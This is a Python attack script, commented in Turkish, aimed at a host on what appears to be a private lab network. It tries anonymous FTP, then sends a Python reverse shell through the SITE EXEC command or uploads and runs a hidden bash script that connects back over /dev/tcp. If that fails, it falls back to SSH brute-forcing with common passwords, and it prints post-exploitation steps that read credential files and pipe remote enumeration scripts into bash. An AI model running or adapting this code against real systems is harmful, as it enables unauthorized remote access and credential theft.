#!/usr/bin/env python3
import os
import subprocess
import random
import string
from ftplib import FTP
import time
import socket
import sys

# Config
host = "10.0.2.33"
username = "anonymous"
password = "anonymous"
reverse_ip = "10.0.2.15"  # Kendi IP'n
reverse_port = 5050
timeout = 5

# Yardımcı Fonksiyonlar
def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def start_listener():
    print(f"[+] {reverse_port} portunda dinleyici başlatılıyor...")
    try:
        subprocess.Popen(["gnome-terminal", "--", "nc", "-lvnp", str(reverse_port)])
        time.sleep(2)
    except:
        print(f"[!] Manuel başlatma gerekli: nc -lvnp {reverse_port}")

# FTP Sızma Fonksiyonları
def check_ftp_commands(ftp):
    print("[*] FTP komut yetkileri kontrol ediliyor...")
    try:
        ftp.sendcmd("SITE EXEC id")
        print("[+] SITE EXEC komutu çalışıyor!")
        return "exec"
    except:
        pass

    try:
        test_file = f"test_{get_random_string(4)}.txt"
        with open(test_file, "w") as f:
            f.write("test")
        ftp.storbinary(f"STOR {test_file}", open(test_file, "rb"))
        ftp.sendcmd(f"SITE CHMOD 777 {test_file}")
        ftp.delete(test_file)
        os.remove(test_file)
        print("[+] CHMOD komutu çalışıyor!")
        return "chmod"
    except:
        pass

    print("[-] Özel FTP komutları çalışmıyor")
    return None

def exploit_via_site_exec(ftp):
    print("[*] SITE EXEC ile reverse shell deniyor...")
    try:
        py_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{reverse_ip}\",{reverse_port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
        ftp.sendcmd(f"SITE EXEC {py_shell}")
        return True
    except Exception as e:
        print(f"[-] SITE EXEC hatası: {e}")
        return False

def upload_and_execute_shell(ftp):
    print("[*] Shell yükleme ve çalıştırma deniyor...")
    try:
        possible_dirs = ["/var/www/html", "/var/www", "/tmp"]
        for directory in possible_dirs:
            try:
                shell_content = f"#!/bin/bash\nbash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1"
                shell_name = f".{get_random_string(6)}.sh"

                with open(shell_name, "w") as f:
                    f.write(shell_content)

                ftp.cwd(directory)
                ftp.storbinary(f"STOR {shell_name}", open(shell_name, "rb"))
                os.remove(shell_name)

                try:
                    ftp.sendcmd(f"SITE CHMOD 777 {shell_name}")
                    ftp.sendcmd(f"SITE EXEC bash {directory}/{shell_name}")
                    print(f"[+] Shell çalıştırıldı: {directory}/{shell_name}")
                    return True
                except:
                    print(f"[-] {directory} dizininde shell çalışmadı")
            except:
                continue
        return False
    except Exception as e:
        print(f"[-] Shell yükleme hatası: {e}")
        return False

# SSH Brute Force
def try_ssh_bruteforce():
    print("[*] SSH brute-force denemesi...")
    common_users = ["root", "admin", "user", "ftp", "anonymous"]
    common_passwords = ["password", "123456", "admin", "ftp", "anonymous", "toor"]

    for user in common_users:
        for pwd in common_passwords:
            try:
                ssh = subprocess.Popen(["sshpass", "-p", pwd, "ssh", f"{user}@{host}", "-o", "StrictHostKeyChecking=no", "id"],
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = ssh.communicate()
                if "uid=" in output.decode():
                    print(f"[+] SSH başarılı! Kullanıcı: {user} Şifre: {pwd}")
                    return (user, pwd)
            except:
                continue
    return None

# Post-Exploitation
def post_exploitation():
    print("\n[+] Shell sonrası bilgi toplama komutları:")
    print("whoami && id && uname -a")
    print("find / -perm -4000 2>/dev/null  # SUID dosyaları")
    print("sudo -l                         # Sudo yetkileri")
    print("cat /etc/passwd | grep sh$")
    print("cat /etc/crontab")
    print("env")
    print("history")
    print("\n[+] Privesc araçları:")
    print("curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash")
    print("curl https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | bash")

# Ana Fonksiyon
def main():
    print("[*] Hedef sisteme saldırı başlatılıyor...")

    start_listener()

    try:
        ftp = FTP(host, timeout=timeout)
        ftp.login(username, password)
        print(f"[+] FTP bağlantısı başarılı: {host}")

        ftp_cmd = check_ftp_commands(ftp)

        if ftp_cmd == "exec":
            if exploit_via_site_exec(ftp):
                print("[+] SITE EXEC ile shell alındı!")
                post_exploitation()
                return

        elif ftp_cmd == "chmod":
            if upload_and_execute_shell(ftp):
                print("[+] Shell yüklendi ve çalıştırıldı!")
                post_exploitation()
                return

        print("[-] FTP ile shell alınamadı.")
        ftp.quit()
    except Exception as e:
        print(f"[-] FTP hatası: {e}")

    ssh_creds = try_ssh_bruteforce()
    if ssh_creds:
        print(f"[+] SSH başarılı! Kullanıcı: {ssh_creds[0]}, Şifre: {ssh_creds[1]}")
        print(f"ssh {ssh_creds[0]}@{host}")
        post_exploitation()
        return

    print("[-] Tüm yöntemler başarısız oldu.")

if __name__ == "__main__":
    main()
